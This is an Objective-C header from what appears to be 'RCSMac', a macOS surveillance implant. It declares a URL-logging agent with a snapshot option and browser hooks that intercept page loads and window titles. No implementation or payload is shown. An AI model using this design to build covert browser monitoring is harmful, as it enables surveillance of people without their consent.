/*
 * RCSMac - URL Agent
 *
 * Created by Alfredo 'revenge' Pesoli on 13/05/2009
 * Modified by Massimo Chiodini on 05/08/2009
 * Copyright (C) HT srl 2009. All rights reserved
 * 
 */

#import <Cocoa/Cocoa.h>

typedef struct _urlConfiguration {
  u_int delimiter;
  BOOL isSnapshotActive;
} urlStruct;

void URLStartAgent();

@interface myBrowserWindowController : NSObject

- (void)webFrameLoadCommittedHook: (id)arg1;

@end

/*
// Firefox 3.0
@interface NSWindow (firefoxHook)

- (void) setTitleHook: (NSString *) title;

@end
*/
